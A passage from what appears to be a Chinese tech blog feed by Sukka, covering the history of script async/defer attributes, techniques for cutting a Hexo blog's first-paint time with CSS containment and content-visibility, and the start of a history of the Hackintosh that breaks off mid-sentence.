<code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\">\n<div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-13</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel 